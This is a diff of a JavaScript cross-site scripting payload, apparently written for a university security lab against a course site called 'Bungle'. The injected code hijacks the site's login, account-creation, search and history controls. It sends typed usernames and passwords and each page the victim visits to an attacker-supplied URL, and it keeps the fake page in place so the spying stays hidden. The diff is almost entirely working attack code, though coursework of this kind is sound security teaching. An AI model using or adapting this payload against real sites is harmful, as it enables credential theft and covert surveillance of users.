@@ -90,26 +90,16 @@ function payload(attacker) {
                 $('title')[0].text = currentTitle;
                 console.log('Update Current Page');
                 inject();
-                // injectIntoPage();
-                // logPage();
-            }
-
-            function updateHistory() {
-                var stateDict = {
-                    'html': $('body').html(),
-                    'title': 'currentTitle',
-                    'page': 'currentPage'
-                }
-                window.history.pushState(stateDict, 'currentTitle', 'currentPage');
             }
             
             function log(data) {
                 console.log($.param(data))
                 $.get(attacker, data);
-                // console.log('test');
             }
 
             var first = true;
+            var currUser = '';
+            var currPass = '';
             
             function inject(){
                 console.log('Original Page');
@@ -129,21 +119,20 @@ function payload(attacker) {
                 $('title', window.parent.document).text('NOT Bungle!');
 
                 $('.form-inline').attr('onsubmit', 'return false');
-
-                log({event: 'nav', user: $('html').contents().find('#logged-in-user').text(), url:'./'});
-
+                
                 // LOG IN BUTTON
                 $('html').contents().find('#log-in-btn').click(function(event){
                     console.log('Log in attempted');
-                    var usern=$('html').contents().find('#username').val();
-                    var passw=$('html').contents().find('#userpass').val();
-                    log({event: 'login', user: usern, pass: passw});
+                    currUser=$('html').contents().find('#username').val();
+                    currPass=$('html').contents().find('#userpass').val();
+
+                    log({event: 'login', user: currUser, pass: currPass});
                     
                     $.post(
                         'http://bungle-cs461.csl.illinois.edu/login',
                         {
-                            username: usern,
-                            password: passw
+                            username: currUser,
+                            password: currPass
                         }
                     )
                     .done(function(data){
@@ -157,9 +146,12 @@ function payload(attacker) {
                 $('html').contents().find('#log-out-btn').click(function(event){
                     console.log('Logout attempted');
                     
-                    var usern=$('html').contents().find('#username').val();
-                    var passw=$('html').contents().find('#userpass').val();
-                    log({event: 'logout', user: usern, pass: passw});
+
+                    log({event: 'logout', user: currUser, pass: currPass});
+                    log({event: 'nav', user: currUser, url:'./'});
+
+                    currUser = '';
+                    currPass = '';
                     
                     $.post('./logout')
                     .done(function(data) {
@@ -171,21 +163,21 @@ function payload(attacker) {
                 // NEW ACCOUNT BUTTON
                 $('html').contents().find('#new-account-btn').click(function(event){
 					$('head title', window.parent.document).text('Bungle!');
-					// history.pushState(null, null, target);
-					var usern=$('html').contents().find('#username').val();
-					var passw=$('html').contents().find('#userpass').val();
+					currUser=$('html').contents().find('#username').val();
+					currPass=$('html').contents().find('#userpass').val();
 
-					log({event: 'login', user: usern, pass: passw});
+					log({event: 'login', user: currUser, pass: currPass});
+                    log({event: 'nav', user: currUser, url:'./'});
 
                     $.post(
                         'http://bungle-cs461.csl.illinois.edu/create',
                         {
-                            username: usern,
-                            password: passw
+                            username: currUser,
+                            password: currPass
                         }
                     )
                     .done(function(data) {
-                        updatePage(data, 'Bungle!', './');
+                        updatePage(data, 'NOT Bungle!', './');
                         return false;
                     })
 				});
@@ -194,9 +186,10 @@ function payload(attacker) {
                 $('html').contents().find('#bungle-lnk').click(function(event){
                     $('html').contents().find('#bungle-lnk').removeAttr('href');
 
+                    log({event: 'nav', user: currUser, url:'./'});
+
                     $.get('./')
                     .done(function(data) {
-                        // updateHistory();
                         updatePage(data, 'NOT Bungle!', './');
                         return false;
                     });
@@ -204,12 +197,13 @@ function payload(attacker) {
 
                 // SEARCH BUTTON
                 $('html').contents().find('#search-btn').click(function(event){
-					// $('head title', window.parent.document).text('Search Results');
 					var q=$('html').contents().find('#query').val();
 					var new_target='http://bungle-cs461.csl.illinois.edu/search?q='+q
+
+                    log({event: 'nav', user: currUser, url:new_target});
+
                     $.get(new_target)
                     .done(function(data) {
-                        // updateHistory();
                         updatePage(data, 'Search Results', new_target);
                         return false;
                     });
@@ -218,9 +212,11 @@ function payload(attacker) {
                 // SEARCH AGAIN BUTTON
                 $('html').contents().find('#search-again-btn').click(function(event){
                     $('html').contents().find('#search-again-btn').removeAttr('href');
+
+                    log({event: 'nav', user: currUser, url:'./'});
+
                     $.get('./')
                     .done(function(data) {
-                        // updateHistory();
                         updatePage(data, 'Search Results', './');
                         return false;
                     });
@@ -230,15 +226,16 @@ function payload(attacker) {
                 $.each($('.history-item'), function() {
                     $('.history-item').removeAttr('href');
                     $(this).click(function() {
-                        var urlS = './search?q=' + this.text;
-                        $.get(urlS)
+
+                        var url_Search = './search?q=' + this.text;
+
+                        log({event: 'nav', user: currUser, url:url_Search});
+                        $.get(url_Search)
                         .done(function(data) {
-                            // history.pushState({'html' : $.parseHTML(data)}, null, urlS);
-                            updatePage(data, 'Search Results', urlS);
+                            updatePage(data, 'Search Results', url_Search);
                             return false;
                         });
                     });
-                    // console.log(this.text);
                     if (this.text.includes('payload(attacker)')) {
                         this.remove();
                     }
@@ -250,9 +247,13 @@ function payload(attacker) {
 
             // TODO implement spying while being stealthy and persistent. Remove the alert.
             // alert('Notice that although we injected code into the search page, you see here the main page!')
+            window.onpopstate = function(e) {
+                updatePage(e.state['html'], e.state['title'], e.state['page']);
+            };
 
         });
-        
+
+
     }
     //Call Proxy
 	proxy('./', attacker);
